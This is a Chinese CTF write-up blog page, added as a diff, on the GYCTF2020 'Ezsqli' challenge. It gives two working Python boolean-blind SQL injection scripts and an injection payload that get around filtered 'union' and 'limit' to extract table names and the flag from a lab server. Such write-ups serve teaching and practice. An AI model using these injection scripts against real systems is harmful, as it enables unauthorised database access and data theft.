@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>&lt;GYCTF2020&gt;Ezsqli - d0ud</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="d0ud">
+    <meta property="og:title" content="&lt;GYCTF2020&gt;Ezsqli"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/bk.jpg) }</style>
+    
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>d0ud</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <!--<form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>-->
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/php/">php</a><a class="category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+            </div>
+        </div>
+        
+            <a href="/friends">ctfers</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>&lt;GYCTF2020&gt;Ezsqli</h2>
+            <div class="post-meta">
+                <time class="date">2021.11.22</time>
+            
+                <span class="category"><a class="category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <p>打开题目，显然是SQL注入</p>
+<p>测试为数字型注入，测试过滤的关键字，可用布尔盲注，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>tar_url=<span class="hljs-string">&quot;http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php&quot;</span><br>get_data=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br>query_table=<span class="hljs-string">&quot;sys.schema_table_statistics&quot;</span><br>query_column_1=<span class="hljs-string">&quot;table_name&quot;</span><br>query_column_2=<span class="hljs-string">&quot;table_schema&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        get_data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">f&quot;0^(ascii(substr((select group_concat(<span class="hljs-subst">&#123;query_column_1&#125;</span>) from <span class="hljs-subst">&#123;query_table&#125;</span> where <span class="hljs-subst">&#123;query_column_2&#125;</span>=database()),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;w&#125;</span>)&quot;</span><br>        repo=requests.post(url=tar_url,data=get_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> repo.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(w),end=<span class="hljs-string">&quot;&quot;</span>) <br></code></pre></td></tr></table></figure>
+<p><del>这个脚本还是挺慢的，但懒得写二分，趁着跑脚本划水也挺好的</del><br>得到表名</p>
+<blockquote>
+<p>users233333333333333,f1ag_1s_h3r3_hhhhh</p>
+</blockquote>
+<p><code>union</code>被过滤了，采用逐个对比的方法查字段数，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">id=0^((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure>
+<p>回显<code>Nu1L</code>，说明字段数为2<br>尝试逐个读取，但<code>limit</code>被过滤了，好在只有一行数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>tar_url=<span class="hljs-string">&quot;http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php&quot;</span><br>get_data=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br>answer=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        suffix=<span class="hljs-built_in">chr</span>(w)<br>        get_data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">f&quot;0^((select &#x27;<span class="hljs-subst">&#123;answer&#125;</span><span class="hljs-subst">&#123;suffix&#125;</span>&#x27;,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span><br>        repo=requests.post(url=tar_url,data=get_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> repo.text:<br>            answer+=<span class="hljs-built_in">chr</span>(w-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(answer)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>结果爆出一堆零，读取第二列，得到flag</p>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">&lt;WUSTCTF2020&gt;颜值成绩查询</a></li>
+                
+                
+                    <li>下一篇: 看完啦 (つд⊂)</li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/GYCTF/" rel="tag">GYCTF</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"><GWCTF 2019>枯燥的抽奖</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BNCTF2019%5DSQLi/"><NCTF2019>SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BRCTF2015%5DEasySQL/"><RCTF2015>EasySQL</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/"><WUSTCTF2020>颜值成绩查询</a></li><li class="post-list-item"><a class="post-list-link" href="/GYCTF2020Ezsqli/"><GYCTF2020>Ezsqli</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">历史：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签：</h3>
+                    <a href="/tags/GWCTF/" style="font-size: 10px;">GWCTF</a> <a href="/tags/GYCTF/" style="font-size: 10px;">GYCTF</a> <a href="/tags/NCTF/" style="font-size: 10px;">NCTF</a> <a href="/tags/RCTF/" style="font-size: 10px;">RCTF</a> <a href="/tags/WUSTCTF/" style="font-size: 10px;">WUSTCTF</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2022 <a href="/">d0ud</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>
+
+  </body>
+</html>
